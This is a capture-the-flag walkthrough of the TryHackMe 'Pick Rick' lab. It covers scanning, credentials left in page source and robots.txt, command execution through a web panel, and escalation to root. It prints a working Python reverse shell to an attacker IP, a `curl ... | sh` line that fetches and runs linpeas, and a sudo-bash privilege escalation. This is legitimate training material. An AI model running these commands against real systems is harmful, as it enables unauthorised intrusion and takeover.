# Pick Rick

```bash
export IP=10.10.189.1
```

## Scans

### Nmap

Open Ports:
```
22 -- ssh
80 -- webserver
```

Found on webserver page source
```
Username: R1ckRul3s
```

Found in /robots.txt
```
Wubbalubbadubdub
```

### Gobuster

Directories found:
```
/assets
/index.html
/login.php
/portal.php
/robots.txt
```

credentials `R1ckRul3s:Wubbalubbadubdub` work on `/login.php` -- redirects to `/portal.php` after success

found in `/portal.php` page source: `Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==`

Turns out to be nested Base64: `rabbit hole`


## Initial Access

'Command Panel' exists on page but there's a blacklist on some commands

**First Ingredient found**: `mr. meeseek hair`
```
grep . Sup3rS3cretPickl3Ingred.txt
```


This tells us other Ingredients are in the file system
```
grep . clue.txt
```

## Reverse Shell

the 'Command Panel' in `/portal.php` runs Python3

Netcat Listening Port:
```bash
nc -lnvp 9001
```

Reverse Shell Command:
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.80.57",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Upgrading Shell to TTY:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Second Ingredient Found**: `1 jerry tear`
```
cd /home/rick/
cat Second Ingredients
```


## Linpeas - Host Enumeration

On Host:
```bash
sudo python -m SimpleHTTPServer 80
```

On Target:
```bash
cd /dev/shm/
curl 10.2.80.57/linpeas.sh | sh
```

Interesting Info found:
```
User www-data may run the following commands on ip-10-10-189-1.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

so:
```bash
sudo bash
```

Root Shell Achieved.

**Third Ingredient Found**: `fleeb juice`


## Final Ingredients List:

1. `mr. meeseek hair` -- found in `/var/www/html/Sup3rS3cretPickl3Ingred.txt`

2. `1 jerry tear` -- found in `/home/rick/second ingredients`

3. `fleeb juice` -- found in `/root/3rd.txt`


---
[back to TryHackMe main page](thm.md)

[back to Index/Table of Contents](index.md)
